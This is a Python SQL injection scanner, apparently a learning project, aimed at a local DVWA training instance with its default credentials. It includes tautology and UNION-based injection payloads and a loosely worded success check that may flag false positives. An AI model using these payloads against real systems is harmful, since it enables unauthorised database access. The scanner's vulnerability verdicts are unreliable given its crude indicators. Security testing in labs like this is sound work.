#!/usr/bin/env python3
"""
GlitchForge - Vulnerability Scanner
Basic SQL injection detection module
"""

import requests
import re
from urllib.parse import urljoin

class VulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
    def login_dvwa(self, login_url, username, password):
        """Login to DVWA and maintain session"""
        # Get the login page first to extract CSRF token
        response = self.session.get(login_url)
        
        # Extract CSRF token if present
        token_match = re.search(r'user_token.*?value=["\']([^"\']+)', response.text)
        
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        if token_match:
            data['user_token'] = token_match.group(1)
        
        response = self.session.post(login_url, data=data)
        
        # Check if login was successful
        success = 'login.php' not in response.url or 'logout' in response.text.lower()
        return success
        
    def test_sql_injection_get(self, url, parameter):
        """Test for SQL injection via GET parameter"""
        payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' #",
            "1' UNION SELECT null, version() #"
        ]
        
        results = []
        for payload in payloads:
            test_url = f"{url}?{parameter}={payload}&Submit=Submit"
            
            try:
                response = self.session.get(test_url)
                
                # Check for successful SQL injection indicators
                success_indicators = [
                    "surname",
                    "first name",
                    "admin",
                    "gordon",
                    "version()"
                ]
                
                vulnerable = any(indicator.lower() in response.text.lower() 
                               for indicator in success_indicators)
                
                results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'status_code': response.status_code,
                    'response_length': len(response.text)
                })
                
            except requests.RequestException as e:
                print(f"Error testing payload {payload}: {e}")
                
        return results
    
    def generate_report(self, results):
        """Generate vulnerability report"""
        print("\n=== GlitchForge Scan Results ===\n")
        print(f"Target: {self.target_url}\n")
        
        vulnerable_count = sum(1 for r in results if r['vulnerable'])
        
        if vulnerable_count > 0:
            print(f"[!] VULNERABLE - {vulnerable_count} payloads succeeded\n")
            for result in results:
                if result['vulnerable']:
                    print(f"  Payload: {result['payload']}")
                    print(f"  Status: {result['status_code']}")
                    print(f"  Response Length: {result['response_length']}\n")
        else:
            print("[+] No SQL injection vulnerabilities detected")
            print("\nDebug info:")
            for result in results:
                print(f"  Payload: {result['payload']} - Length: {result['response_length']}")

if __name__ == "__main__":
    base_url = "http://192.168.1.127/DVWA"
    login_url = f"{base_url}/login.php"
    target = f"{base_url}/vulnerabilities/sqli/"
    
    scanner = VulnerabilityScanner(target)
    
    # Login first
    print("Logging into DVWA...")
    if scanner.login_dvwa(login_url, "admin", "password"):
        print("Login successful!\n")
        
        # Test SQL injection
        results = scanner.test_sql_injection_get(target, "id")
        scanner.generate_report(results)
    else:
        print("Login failed. Check DVWA is running and credentials are correct.")